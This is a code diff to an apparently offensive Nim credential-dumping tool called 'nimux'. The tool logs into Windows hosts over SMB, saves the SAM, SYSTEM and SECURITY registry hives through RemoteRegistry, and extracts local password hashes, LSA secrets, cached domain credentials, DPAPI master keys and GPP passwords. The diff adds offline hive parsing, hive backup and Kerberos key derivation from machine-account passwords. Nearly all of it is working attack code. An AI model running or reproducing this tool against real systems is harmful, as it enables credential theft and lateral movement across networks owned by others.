@@ -1,7 +1,6 @@
 import std/[asyncdispatch, base64, md5, os, random, strutils, times]
 import ../smb/client as smb
 import ../rrp/client as rrp
-import output as smbfiles
 import transfer as smbtransfer
 import dpapi as dpapimod
 
@@ -29,41 +28,60 @@ proc EVP_sha1(): pointer {.cdecl, importc, header: "<openssl/evp.h>".}
 type DesKeySchedule {.importc: "DES_key_schedule", header: "<openssl/des.h>".} = object
 proc DES_set_key_unchecked(key: pointer; schedule: ptr DesKeySchedule) {.cdecl, importc, header: "<openssl/des.h>".}
 proc DES_ecb_encrypt(inp, outp: pointer; schedule: ptr DesKeySchedule; enc: cint) {.cdecl, importc, header: "<openssl/des.h>".}
+const DES_ENCRYPT = 1.cint
 const DES_DECRYPT = 0.cint
 
 proc kerbNfold(s: string; nBits: int): string =
-  let l = s.len * 8
-  func gcd(a, b: int): int =
-    var x = a; var y = b
-    while y != 0: (let t = y; y = x mod y; x = t)
+  if s.len == 0 or nBits mod 8 != 0: return ""
+  let nBytes = nBits div 8
+
+  func gcdInt(a, b: int): int =
+    var x = a
+    var y = b
+    while y != 0:
+      let t = y
+      y = x mod y
+      x = t
     x
-  let lcmBits = (l * nBits) div gcd(l, nBits)
-  let rLen = nBits div 8
-  result = newString(rLen)
-  var carry = 0
-  let totalBytes = lcmBits div 8
-  for i in countdown(totalBytes - 1, 0):
-    let copy = i div s.len
-    let offInCopy = i mod s.len
-    let rot = (13 * copy) mod l
-    var extByte: uint8 = 0
-    for b in 0 ..< 8:
-      let srcBitPos = (offInCopy * 8 + b + rot) mod l
-      let srcByteIdx = srcBitPos div 8
-      let srcBitInByte = srcBitPos mod 8
-      let bit = (uint8(ord(s[srcByteIdx])) shr uint8(7 - srcBitInByte)) and 1
-      extByte = extByte or (bit shl uint8(7 - b))
-    let pos = i mod rLen
-    let v = int(ord(result[pos])) + int(extByte) + carry
-    result[pos] = chr(v and 0xff)
-    carry = v shr 8
-  var pos = rLen - 1
-  while carry > 0:
-    let v = int(ord(result[pos])) + carry
-    result[pos] = chr(v and 0xff)
-    carry = v shr 8
-    dec pos
-    if pos < 0: pos = rLen - 1
+
+  proc rotateRight(input: string; nbits: int): string =
+    result = newString(input.len)
+    let nbytes = (nbits div 8) mod input.len
+    let remain = nbits mod 8
+    for i in 0 ..< input.len:
+      let a = uint8(ord(input[(i - nbytes + input.len) mod input.len]))
+      let b = uint8(ord(input[(i - nbytes - 1 + input.len * 2) mod input.len]))
+      result[i] = chr(int((a shr uint8(remain)) or ((b shl uint8(8 - remain)) and 0xff'u8)))
+
+  proc addOnesComplement(a, b: string): string =
+    var v = newSeq[int](a.len)
+    for i in 0 ..< a.len:
+      v[i] = ord(a[i]) + ord(b[i])
+    var changed = true
+    while changed:
+      changed = false
+      for x in v:
+        if (x and (not 0xff)) != 0:
+          changed = true
+          break
+      if changed:
+        var next = newSeq[int](v.len)
+        for i in 0 ..< v.len:
+          next[i] = (v[(i - v.len + 1 + v.len * 2) mod v.len] shr 8) + (v[i] and 0xff)
+        v = next
+    result = newString(a.len)
+    for i in 0 ..< v.len:
+      result[i] = chr(v[i] and 0xff)
+
+  let lcm = (nBytes * s.len) div gcdInt(nBytes, s.len)
+  var big = ""
+  for i in 0 ..< (lcm div s.len):
+    big.add rotateRight(s, 13 * i)
+  result = big[0 ..< nBytes]
+  var pos = nBytes
+  while pos < big.len:
+    result = addOnesComplement(result, big[pos ..< pos + nBytes])
+    pos += nBytes
 
 proc aesEcbEncryptBlock(key: string; keyBits: int; plaintext: string): string =
   let cipher = if keyBits == 256: EVP_aes_256_ecb() else: EVP_aes_128_ecb()
@@ -97,19 +115,104 @@ proc kerbStringToKeyAes(passwordUtf8, salt: string; keyLen: int): string =
     cast[pointer](addr seed[0]))
   result = kerbDeriveKey(seed, keyLen)
 
+proc setOddParity7(byteVal: uint8): uint8 =
+  let seven = byteVal and 0xFE'u8
+  var ones = 0
+  for bit in 1 .. 7:
+    if ((seven shr uint8(bit)) and 1'u8) == 1'u8: inc ones
+  result = seven or (if ones mod 2 == 0: 1'u8 else: 0'u8)
+
+proc addDesParity(bytes7: seq[uint8]): string =
+  result = newString(bytes7.len)
+  for i, b in bytes7:
+    var ones = 0
+    var tmp = b
+    while tmp != 0:
+      if (tmp and 1'u8) == 1'u8: inc ones
+      tmp = tmp shr 1
+    let shifted =
+      if ones mod 2 == 0:
+        ((b shl 1) or 1'u8)
+      else:
+        ((b shl 1) and 0xfe'u8)
+    result[i] = chr(int(shifted))
+
+proc fixDesParity(desKey: string): string =
+  result = newString(desKey.len)
+  for i, ch in desKey:
+    result[i] = chr(int(setOddParity7(uint8(ord(ch)))))
+
+proc isWeakDesKey(key: string): bool =
+  const weak = [
+    "0101010101010101", "fefefefefefefefe", "1f1f1f1f0e0e0e0e", "e0e0e0e0f1f1f1f1",
+    "01fe01fe01fe01fe", "fe01fe01fe01fe01", "1fe01fe00ef10ef1", "e01fe01ff10ef10e",
+    "01e001e001f101f1", "e001e001f101f101", "1ffe1ffe0efe0efe", "fe1ffe1ffe0efe0e",
+    "011f011f010e010e", "1f011f010e010e01", "e0fee0fef1fef1fe", "fee0fee0fef1fef1"
+  ]
+  const hexChars = "0123456789abcdef"
+  var h = ""
+  for ch in key:
+    let b = ord(ch)
+    h.add hexChars[(b shr 4) and 0xf]
+    h.add hexChars[b and 0xf]
+  for w in weak:
+    if h == w: return true
+
+proc desCbcEncrypt(key, iv, data: string): string =
+  if key.len != 8 or iv.len != 8 or data.len mod 8 != 0: return ""
+  var sched: DesKeySchedule
+  DES_set_key_unchecked(cast[pointer](unsafeAddr key[0]), addr sched)
+  var prev = iv
+  result = newString(data.len)
+  var off = 0
+  while off < data.len:
+    var blk = newString(8)
+    for i in 0 ..< 8:
+      blk[i] = chr(ord(data[off + i]) xor ord(prev[i]))
+    var enc = newString(8)
+    DES_ecb_encrypt(cast[pointer](addr blk[0]), cast[pointer](addr enc[0]), addr sched, DES_ENCRYPT)
+    for i in 0 ..< 8:
+      result[off + i] = enc[i]
+    prev = enc
+    off += 8
+
 proc kerbStringToKeyDes(passwordUtf8, salt: string): string =
-  let raw = kerbNfold(passwordUtf8 & salt, 64)
-  result = newString(8)
-  for i in 0 ..< 8:
-    let b = uint8(ord(raw[i]))
-    var v = (b and 0xFE'u8) or 1'u8
-    var parity: uint8 = 0
-    var bv = v
-    while bv != 0:
-      parity = parity xor (bv and 1)
-      bv = bv shr 1
-    if parity == 0: v = v xor 1
-    result[i] = chr(int(v))
+  var s = passwordUtf8 & salt
+  while s.len mod 8 != 0: s.add '\0'
+  var odd = true
+  var temp = newSeq[uint8](8)
+  var off = 0
+  while off < s.len:
+    var temp56 = newSeq[uint8](8)
+    for i in 0 ..< 8:
+      temp56[i] = uint8(ord(s[off + i])) and 0x7f'u8
+    if not odd:
+      var bits = ""
+      for b in temp56:
+        for k in countdown(6, 0):
+          bits.add(if ((b shr uint8(k)) and 1'u8) == 1'u8: '1' else: '0')
+      var rev = newString(bits.len)
+      for i in 0 ..< bits.len:
+        rev[i] = bits[bits.len - 1 - i]
+      bits = rev
+      for i in 0 ..< 8:
+        var v: uint8 = 0
+        for k in 0 ..< 7:
+          v = (v shl 1) or (if bits[i * 7 + k] == '1': 1'u8 else: 0'u8)
+        temp56[i] = v
+    odd = not odd
+    for i in 0 ..< 8:
+      temp[i] = (temp[i] xor temp56[i]) and 0x7f'u8
+    off += 8
+  var tempKey = addDesParity(temp)
+  if isWeakDesKey(tempKey):
+    tempKey[7] = chr(ord(tempKey[7]) xor 0xf0)
+  var checksumKey = desCbcEncrypt(tempKey, tempKey, s)
+  if checksumKey.len >= 8:
+    checksumKey = checksumKey[^8 .. ^1]
+  result = fixDesParity(checksumKey)
+  if isWeakDesKey(result):
+    result[7] = chr(ord(result[7]) xor 0xf0)
 
 type Rc4State = object
   s: array[256, uint8]
@@ -251,6 +354,20 @@ type
     changed*: string
     disabled*: string
 
+  SavedHive* = object
+    hive*: string
+    remotePath*: string
+    status*: uint32
+
+  HiveBackupResult* = object
+    host*: string
+    port*: int
+    authenticated*: bool
+    saved*: seq[SavedHive]
+    success*: bool
+    message*: string
+    error*: string
+
   SecretsResult* = object
     host*: string
     port*: int
@@ -320,7 +437,7 @@ proc hiveNameFromNk(cell: string): string =
 
 proc hiveClassFromNk(cell: string; h: RegHive): string =
   if cell.len < 0x4c or cell[0 ..< 2] != "nk": return ""
-  let classOff = rrp.readU32Le(cell, 0x34)
+  let classOff = rrp.readU32Le(cell, 0x30)
   let classLen = int(uint16(ord(cell[0x4a])) or (uint16(ord(cell[0x4b])) shl 8))
   if classOff == 0xffffffff'u32 or classLen <= 0: return ""
   let classCell = h.hiveCell(classOff)
@@ -451,7 +568,11 @@ proc bootKeyFromSystemHive(systemHive: string): string =
     if base.len == 0: continue
     var raw = ""
     for name in ["JD", "Skew1", "GBG", "Data"]:
-      raw.add hiveKeyClass(h, base & "\\Control\\Lsa\\" & name)
+      let cls = hiveKeyClass(h, base & "\\Control\\Lsa\\" & name)
+      if cls.len >= 2 and ord(cls[1]) == 0:
+        raw.add fromUtf16Le(cls)
+      else:
+        raw.add cls
     if raw.len == 32:
       var hexBytes = newString(16)
       for i in 0 ..< 16:
@@ -652,8 +773,17 @@ proc dumpSamHive(samHive: string; bootKey: string): seq[SamAccount] =
       acct.lmHash = decryptSamHash(hashedBootKey, rid, vData[lmOff ..< lmOff + lmLen], lmPass)
     result.add acct
 
-proc getLsaKey(s: rrp.RrpSession; bootKey: string): Future[string] {.async.} =
-  let polEklist = await s.readKeyData("SECURITY\\Policy", "PolEKList")
+proc getLsaKey(s: rrp.RrpSession; bootKey: string; debugLog: proc(msg: string) = nil): Future[string] {.async.} =
+  proc readDefaultValue(path: string): Future[string] {.async.} =
+    result = await s.readKeyData(path, "")
+    if debugLog != nil:
+      debugLog(path & " empty-name len=" & $result.len & " status=0x" & s.lastStatus.toHex(8))
+    if result.len == 0:
+      result = await s.readKeyData(path, "default")
+      if debugLog != nil:
+        debugLog(path & " default-name len=" & $result.len & " status=0x" & s.lastStatus.toHex(8))
+
+  let polEklist = await readDefaultValue("SECURITY\\Policy\\PolEKList")
   if polEklist.len > 60:
     let encData = polEklist[28 ..< polEklist.len]
     let iv = encData[0 ..< 32]
@@ -672,7 +802,7 @@ proc getLsaKey(s: rrp.RrpSession; bootKey: string): Future[string] {.async.} =
         result = secret[52 ..< 84]
         return
 
-  let polSek = await s.readKeyData("SECURITY\\Policy", "PolSecretEncryptionKey")
+  let polSek = await readDefaultValue("SECURITY\\Policy\\PolSecretEncryptionKey")
   if polSek.len < 60: return ""
   var ctx2 = md5Bytes(bootKey)
   for _ in 0 ..< 1000:
@@ -741,6 +871,52 @@ proc fromUtf16Le(s: string): string =
       result.add char(0x80 or ((cp shr 6) and 0x3F))
       result.add char(0x80 or (cp and 0x3F))
 
+proc addUtf8Cp(dst: var string; cp: uint32) =
+  if cp < 0x80:
+    dst.add char(cp)
+  elif cp < 0x800:
+    dst.add char(0xC0 or (cp shr 6))
+    dst.add char(0x80 or (cp and 0x3F))
+  elif cp < 0x10000:
+    dst.add char(0xE0 or (cp shr 12))
+    dst.add char(0x80 or ((cp shr 6) and 0x3F))
+    dst.add char(0x80 or (cp and 0x3F))
+  else:
+    dst.add char(0xF0 or (cp shr 18))
+    dst.add char(0x80 or ((cp shr 12) and 0x3F))
+    dst.add char(0x80 or ((cp shr 6) and 0x3F))
+    dst.add char(0x80 or (cp and 0x3F))
+
+proc fromUtf16LeReplace(s: string): string =
+  var i = 0
+  while i + 1 < s.len:
+    let w1 = uint32(ord(s[i])) or (uint32(ord(s[i+1])) shl 8)
+    i += 2
+    if w1 >= 0xD800 and w1 <= 0xDBFF:
+      if i + 1 < s.len:
+        let w2 = uint32(ord(s[i])) or (uint32(ord(s[i+1])) shl 8)
+        if w2 >= 0xDC00 and w2 <= 0xDFFF:
+          i += 2
+          let cp = 0x10000'u32 + ((w1 - 0xD800'u32) shl 10) + (w2 - 0xDC00'u32)
+          result.addUtf8Cp(cp)
+        else:
+          result.addUtf8Cp(0xFFFD)
+      else:
+        result.addUtf8Cp(0xFFFD)
+    elif w1 >= 0xDC00 and w1 <= 0xDFFF:
+      result.addUtf8Cp(0xFFFD)
+    else:
+      result.addUtf8Cp(w1)
+  if i < s.len:
+    result.addUtf8Cp(0xFFFD)
+
+proc nt4DomainName(domain: string): string =
+  let clean = domain.strip()
+  if clean.len == 0: return ""
+  let first = clean.split('.')[0].strip()
+  if first.len == 0: return ""
+  first.toUpperAscii()
+
 proc classifyLsaSecret(name, plainText, host, domain: string): LsaSecret =
   let upper = name.toUpperAscii()
   result.name = name
@@ -754,14 +930,15 @@ proc classifyLsaSecret(name, plainText, host, domain: string): LsaSecret =
     result.secretType = "machine_acc"
     if plainText.len >= 2:
       result.ntHash = toHexStr(smb.md4Digest(plainText))
-      let domainUp = domain.toUpperAscii()
+      let realmUp = domain.toUpperAscii()
+      let domainUp = nt4DomainName(domain)
       let dot = host.find('.')
       let shortHost = if dot > 0: host[0 ..< dot].toLowerAscii() else: host.toLowerAscii()
       let fqdn =
         if domain.len > 0: shortHost & "." & domain.toLowerAscii()
         else: shortHost
-      let salt = domainUp & "host" & fqdn
-      let passwordUtf8 = fromUtf16Le(plainText)
+      let salt = realmUp & "host" & fqdn
+      let passwordUtf8 = fromUtf16LeReplace(plainText)
       let aes256 = kerbStringToKeyAes(passwordUtf8, salt, 32)
       let aes128 = kerbStringToKeyAes(passwordUtf8, salt, 16)
       let des    = kerbStringToKeyDes(passwordUtf8, salt)
@@ -948,18 +1125,107 @@ proc dumpCachedCredsHive(securityHive: string; lsaKey: string): seq[CachedEntry]
       iterations: iterCount
     )
 
+proc systemComputerName(systemHive: string): string =
+  let h = RegHive(data: systemHive)
+  var cs = ""
+  let current = hiveReadValue(h, "Select", "Current")
+  if current.len >= 4:
+    cs = "ControlSet" & align($rrp.readU32Le(current, 0).int, 3, '0')
+  for base in [cs, "ControlSet001", "ControlSet002"]:
+    if base.len == 0: continue
+    let raw = hiveReadValue(h, base & "\\Control\\ComputerName\\ComputerName", "ComputerName")
+    if raw.len == 0: continue
+    let decoded = if raw.len >= 2 and ord(raw[1]) == 0: fromUtf16Le(raw) else: raw.strip(chars = {'\0'})
+    if decoded.len > 0: return decoded
+
+proc decodeLsaUnicodeValue(raw: string): string =
+  if raw.len < 8: return ""
+  let length = int(uint16(ord(raw[0])) or (uint16(ord(raw[1])) shl 8))
+  if length <= 0 or 8 + length > raw.len: return ""
+  result = fromUtf16Le(raw[8 ..< 8 + length]).strip(chars = {'\0'})
+
+proc securityDomainFqdn(securityHive: string): string =
+  let h = RegHive(data: securityHive)
+  result = decodeLsaUnicodeValue(hiveReadValue(h, "Policy\\PolDnDDN", "default"))
+
+proc securityMachineName(securityHive: string): string =
+  let h = RegHive(data: securityHive)
+  result = decodeLsaUnicodeValue(hiveReadValue(h, "Policy\\PolAcDmN", "default"))
+
+proc parseOfflineHives*(samPath, securityPath, systemPath, host, domain: string): SecretsResult =
+  result = SecretsResult(host: host, port: 0, authenticated: true)
+  if samPath.len == 0 or securityPath.len == 0 or systemPath.len == 0:
+    result.error = "offline parse requires --sam, --security and --system"
+    return
+  if not fileExists(samPath):
+    result.error = "SAM hive not found: " & samPath
+    return
+  if not fileExists(securityPath):
+    result.error = "SECURITY hive not found: " & securityPath
+    return
+  if not fileExists(systemPath):
+    result.error = "SYSTEM hive not found: " & systemPath
+    return
+
+  let samHive = readFile(samPath)
+  let securityHive = readFile(securityPath)
+  let systemHive = readFile(systemPath)
+  let bootKey = bootKeyFromSystemHive(systemHive)
+  if bootKey.len == 0:
+    result.error = "failed to derive boot key from SYSTEM hive"
+    return
+  result.bootKey = toHexStr(bootKey)
+
+  var effectiveDomain = domain
+  if effectiveDomain.len == 0:
+    effectiveDomain = securityDomainFqdn(securityHive)
+  var effectiveHost = host
+  if effectiveHost.toUpperAscii() == "LOCAL" or effectiveHost.len == 0:
+    let secName = securityMachineName(securityHive)
+    let computerName = if secName.len > 0: secName else: systemComputerName(systemHive)
+    if computerName.len > 0:
+      effectiveHost =
+        if effectiveDomain.len > 0: computerName.toLowerAscii() & "." & effectiveDomain.toLowerAscii()
+        else: computerName.toLowerAscii()
+  result.host = effectiveHost
+
+  result.samAccounts = dumpSamHive(samHive, bootKey)
+  let lsaKey = getLsaKeyHive(securityHive, bootKey)
+  result.hiveLsaKey = lsaKey
+  if lsaKey.len >= 16:
+    for s in dumpLsaSecretsHive(securityHive, lsaKey, effectiveHost, effectiveDomain):
+      if s.secretType == "dpapi_system" and s.plainText.len >= 44:
+        result.dpapiMachineKey = toHexStr(s.plainText[4..23])
+        result.dpapiUserKey = toHexStr(s.plainText[24..43])
+      result.lsaSecrets.add s
+    let (oldMK, oldUK) = readDpapiSystemOldKeyHive(securityHive, lsaKey)
+    result.dpapiMachineKeyOld = oldMK
+    result.dpapiUserKeyOld = oldUK
+    result.cachedCreds = dumpCachedCredsHive(securityHive, lsaKey)
+
+  result.success = result.samAccounts.len > 0 or result.lsaSecrets.len > 0 or
+    result.cachedCreds.len > 0 or result.dpapiMachineKey.len > 0
+  if result.success:
+    result.message = "parsed offline registry hives"
+  else:
+    result.error = "offline hive parse completed but found no secrets"
+
 proc nativeHiveFallback(session: smb.SmbSession; sess: rrp.RrpSession;
                         host: string; port: int; bootKey, domain: string): Future[SecretsResult] {.async.} =
+  let fallbackDebug = getEnv("NIMUX_DEBUG").len > 0
+  proc debugFallback(msg: string) =
+    if fallbackDebug:
+      stderr.writeLine("[secrets-debug] fallback " & msg)
   result.host = host
   result.port = port
   result.authenticated = true
-  let treeId =
-    if session.adminTreeId != 0: session.adminTreeId
-    else: await smb.connectShareTree(session, "ADMIN$")
+  debugFallback("connect C$")
+  let treeId = await smb.connectShareTree(session, "C$")
   if treeId == 0:
-    result.error = "native hive fallback failed: ADMIN$ tree connect failed"
+    result.error = "native hive fallback failed: C$ tree connect failed"
     return
 
+  debugFallback("fresh rrp connect")
   let freshSess = rrp.newRrpSession(session.ctx)
   let freshOk = await freshSess.connect()
   if not freshOk:
@@ -968,41 +1234,38 @@ proc nativeHiveFallback(session: smb.SmbSession; sess: rrp.RrpSession;
 
   randomize()
   let prefix = "nimux-" & $int(epochTime()) & "-" & $rand(999999)
+  var systemHive = ""
   var samHive = ""
   var securityHive = ""
 
-  let savePaths = [
-    ("C:\\Windows\\Temp\\", "Temp\\"),
-    ("..\\Temp\\", "Temp\\"),
-    ("Temp\\", "Temp\\"),
-    ("\\Windows\\Temp\\", "Temp\\"),
-  ]
-
-  for hiveName in ["SAM", "SECURITY"]:
-    let fileName = prefix & "-" & hiveName.toLowerAscii() & ".tmp"
+  for hiveName in ["SYSTEM", "SAM", "SECURITY"]:
+    debugFallback("save/read " & hiveName)
+    let fileName = prefix & "-" & hiveName.toLowerAscii() & ".save"
     var saved = false
-    var savedRemotePath = ""
     var lastStatus: uint32 = 0
-    for (savePath, readPath) in savePaths:
+    for savePath in ["C:\\Windows\\Temp\\", "\\Windows\\Temp\\"]:
       let saveStatus = await freshSess.saveKey(hiveName, savePath & fileName)
+      debugFallback(hiveName & " save " & savePath & " status=0x" & saveStatus.toHex(8))
       lastStatus = saveStatus
       if saveStatus == 0:
-        let remotePath = readPath & fileName
-        var r: tuple[exists: bool; data: string]
-        for attempt in 0 ..< 20:
-          r = await smbfiles.readSmbFile(session.ctx, treeId, remotePath, false)
-          if r.exists and r.data.len > 0:
+        let remotePath = "Windows\\Temp\\" & fileName
+        var data = ""
+        await sleepAsync(1000)
+        for attempt in 0 ..< 12:
+          debugFallback(hiveName & " read attempt " & $attempt & " " & remotePath)
+          data = await smbtransfer.readFileIntoMemory(session, treeId, remotePath, 128 * 1024 * 1024)
+          debugFallback(hiveName & " read len=" & $data.len)
+          if data.len > 0:
             break
           await sleepAsync(250 + attempt * 100)
-        if r.exists and r.data.len > 0:
-          discard await smbfiles.readSmbFile(session.ctx, treeId, remotePath, true)
+        if data.len > 0:
           case hiveName
-          of "SAM": samHive = r.data
-          of "SECURITY": securityHive = r.data
+          of "SYSTEM": systemHive = data
+          of "SAM": samHive = data
+          of "SECURITY": securityHive = data
           else: discard
           saved = true
           break
-        discard await smbfiles.readSmbFile(session.ctx, treeId, remotePath, true)
     if not saved:
       let hint =
         if lastStatus == 0xC0000022'u32 or lastStatus == 0x00000005'u32:
@@ -1014,29 +1277,39 @@ proc nativeHiveFallback(session: smb.SmbSession; sess: rrp.RrpSession;
         " status 0x" & lastStatus.toHex(8) & hint
       return
 
-  result.bootKey = toHexStr(bootKey)
-  result.samAccounts = dumpSamHive(samHive, bootKey)
-  let lsaKey = getLsaKeyHive(securityHive, bootKey)
+  var effectiveBootKey = bootKey
+  debugFallback("parse hives")
+  if effectiveBootKey.len == 0 and systemHive.len > 0:
+    effectiveBootKey = bootKeyFromSystemHive(systemHive)
+  if effectiveBootKey.len == 0:
+    result.error = "native hive fallback failed: failed to derive boot key from SYSTEM hive"
+    return
+
+  result.bootKey = toHexStr(effectiveBootKey)
+  var effectiveDomain = domain
+  if effectiveDomain.len == 0:
+    effectiveDomain = securityDomainFqdn(securityHive)
+  var effectiveHost = host
+  let secName = securityMachineName(securityHive)
+  let computerName = if secName.len > 0: secName else: systemComputerName(systemHive)
+  if computerName.len > 0:
+    effectiveHost =
+      if effectiveDomain.len > 0: computerName.toLowerAscii() & "." & effectiveDomain.toLowerAscii()
+      else: computerName.toLowerAscii()
+  result.host = effectiveHost
+  result.samAccounts = dumpSamHive(samHive, effectiveBootKey)
+  let lsaKey = getLsaKeyHive(securityHive, effectiveBootKey)
   result.hiveLsaKey = lsaKey
   if lsaKey.len >= 16:
-    proc decodeRegSzHive(raw: string): string =
-      if raw.len >= 2 and ord(raw[1]) == 0: return fromUtf16Le(raw)
-      result = raw
-      while result.len > 0 and ord(result[^1]) == 0: result.setLen(result.len - 1)
     var defUser = ""
     var defDomain = ""
-    let winlogonPath = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
-    let wSess2 = rrp.newRrpSession(session.ctx)
-    if await wSess2.connect():
-      defUser   = decodeRegSzHive(await wSess2.readKeyData(winlogonPath, "DefaultUserName"))
-      defDomain = decodeRegSzHive(await wSess2.readKeyData(winlogonPath, "DefaultDomainName"))
-    for s2 in dumpLsaSecretsHive(securityHive, lsaKey, host, domain):
+    for s2 in dumpLsaSecretsHive(securityHive, lsaKey, effectiveHost, effectiveDomain):
       if s2.secretType == "dpapi_system" and s2.plainText.len >= 44:
         result.dpapiMachineKey = toHexStr(s2.plainText[4..23])
         result.dpapiUserKey    = toHexStr(s2.plainText[24..43])
       elif s2.secretType == "default_password":
         var s3 = s2
-        let effDomain = if defDomain.len > 0: defDomain elif domain.len > 0: domain else: host
+        let effDomain = if defDomain.len > 0: defDomain elif effectiveDomain.len > 0: effectiveDomain else: effectiveHost
         s3.accountName = if defUser.len > 0: effDomain & "\\" & defUser else: ""
         result.lsaSecrets.add s3
       elif s2.secretType == "backup_key":
@@ -1062,6 +1335,51 @@ proc nativeHiveFallback(session: smb.SmbSession; sess: rrp.RrpSession;
     result.message = "dumped via native RRP hive save/readback"
   else:
     result.error = "native hive fallback completed but parsed no secrets"
+
+proc backupHives*(host: string; port, timeoutMs: int;
+                  username, password, ntlmHash, domain, remoteDir: string;
+                  kerberos = false; ccache = ""; krb5Config = ""): Future[HiveBackupResult] {.async.} =
+  result = HiveBackupResult(host: host, port: port)
+  let cred = smb.SmbCredential(
+    username: username, password: password,
+    ntlmHash: ntlmHash, domain: domain,
+    ccache: ccache, krb5Config: krb5Config
+  )
+  let authMethod = if kerberos: smb.samKerberos else: smb.samNtlm
+
+  var session: smb.SmbSession
+  try:
+    session = await smb.establishSmbSession(host, port, timeoutMs, cred, authMethod)
+  except:
+    result.error = "SMB connection failed: " & getCurrentExceptionMsg()
+    return
+  if not session.authenticated:
+    result.error = "SMB authentication failed" &
+      (if session.message.len > 0: ": " & session.message else: "")
+    return
+  result.authenticated = true
+
+  let reg = rrp.newRrpSession(session.ctx)
+  if not await reg.connect():
+    result.error = "RemoteRegistry/RRP connection failed: " & reg.error
+    return
+
+  let baseDir =
+    if remoteDir.len > 0: remoteDir.strip(chars = {'\\', '/'}, leading = false)
+    else: "C:\\Windows\\Temp"
+  randomize()
+  let prefix = "nimux-" & $int(epochTime()) & "-" & $rand(999999)
+  for hive in ["SAM", "SYSTEM", "SECURITY"]:
+    let remotePath = baseDir.strip(chars = {'\\', '/'}, trailing = true) &
+      "\\" & prefix & "-" & hive.toLowerAscii() & ".save"
+    let status = await reg.saveKey(hive, remotePath)
+    result.saved.add SavedHive(hive: hive, remotePath: remotePath, status: status)
+    if status != 0:
+      result.error = "failed to save " & hive & " status 0x" & status.toHex(8)
+      return
+
+  result.success = true
+  result.message = "saved HKLM\\SAM, HKLM\\SYSTEM and HKLM\\SECURITY via RemoteRegistry"
 
 proc extractBackupKeyPrivBlob(plainText: string): string =
   if plainText.len < 12: return ""
@@ -1339,6 +1657,10 @@ proc dumpSecrets*(host: string; port, timeoutMs: int;
                   fullFallback = false; kerberos = false;
                   ccache = ""; krb5Config = ""): Future[SecretsResult] {.async.} =
   result = SecretsResult(host: host, port: port)
+  let secretsDebug = getEnv("NIMUX_DEBUG").len > 0
+  proc debugPhase(msg: string) =
+    if secretsDebug:
+      stderr.writeLine("[secrets-debug] " & msg)
 
   let cred = smb.SmbCredential(
     username: username, password: password,
@@ -1349,6 +1671,7 @@ proc dumpSecrets*(host: string; port, timeoutMs: int;
 
   var session: smb.SmbSession
   try:
+    debugPhase("smb connect")
     session = await smb.establishSmbSession(host, port, timeoutMs, cred, authMethod)
   except:
     result.error = "SMB connection failed: " & getCurrentExceptionMsg()
@@ -1360,6 +1683,7 @@ proc dumpSecrets*(host: string; port, timeoutMs: int;
 
   result.authenticated = true
 
+  debugPhase("rrp connect")
   let sess = rrp.newRrpSession(session.ctx)
   let connected = await sess.connect()
   if not connected:
@@ -1367,28 +1691,35 @@ proc dumpSecrets*(host: string; port, timeoutMs: int;
     result.message = "no Windows registry (Linux/Samba DC — use dcsync for hashes)"
     return
 
+  debugPhase("boot key")
   let bootKey = await getBootKey(sess)
   if bootKey.len == 0:
-    result.error = "failed to read boot key from SYSTEM hive"
+    result = await nativeHiveFallback(session, sess, host, port, "", domain)
+    result.port = port
     return
   result.bootKey = toHexStr(bootKey)
 
+  debugPhase("sam")
   let samAccts = await dumpSam(sess, bootKey)
   result.samAccounts = samAccts
   let samAccessDenied = result.samAccounts.len == 0 and sess.lastStatus == 5'u32
 
   let secCtx = rrp.newRrpSession(session.ctx)
+  debugPhase("security rrp connect")
   let secConnected = await secCtx.connect()
   var lsaKey = ""
   if secConnected:
-    lsaKey = await getLsaKey(secCtx, bootKey)
+    debugPhase("lsa key")
+    lsaKey = await getLsaKey(secCtx, bootKey, debugPhase)
 
+  debugPhase("domain backup key")
   try:
     result.domainBackupKey = await fetchDomainBackupKey(session, lsaKey)
   except CatchableError:
     discard
 
   if lsaKey.len >= 16:
+    debugPhase("lsa secrets")
     let secrets = await dumpLsaSecrets(secCtx, lsaKey, host, domain)
     proc decodeRegSz(raw: string): string =
       if raw.len >= 2 and ord(raw[1]) == 0: return fromUtf16Le(raw)
@@ -1466,11 +1797,13 @@ proc dumpSecrets*(host: string; port, timeoutMs: int;
           result.dpapiMachineKeyOld = toHexStr(oldPlain[4..23])
           result.dpapiUserKeyOld    = toHexStr(oldPlain[24..43])
 
+    debugPhase("cached creds")
     let cached = await dumpCachedCreds(secCtx, lsaKey)
     result.cachedCreds = cached
 
   if result.dpapiMachineKey.len > 0 or result.dpapiUserKey.len > 0:
     try:
+      debugPhase("dpapi master keys")
       result.dpapiMasterKeys = await dpapimod.fetchAndDecryptMasterKeys(
         session, result.dpapiMachineKey, result.dpapiUserKey,
         result.dpapiMachineKeyOld, result.dpapiUserKeyOld,
@@ -1505,6 +1838,7 @@ proc dumpSecrets*(host: string; port, timeoutMs: int;
 
   if result.dpapiMasterKeys.len > 0:
     try:
+      debugPhase("dpapi credentials")
       let allMasterKeys = result.dpapiMasterKeys
       result.dpapiCredentials = await dpapimod.fetchAndDecryptCredentials(session, allMasterKeys)
       var userAccts: seq[tuple[username, ntHashHex: string]]
@@ -1528,6 +1862,7 @@ proc dumpSecrets*(host: string; port, timeoutMs: int;
       discard
 
   try:
+    debugPhase("gpp")
     result.gppPasswords = await dumpGppPasswords(session)
   except CatchableError:
     discard
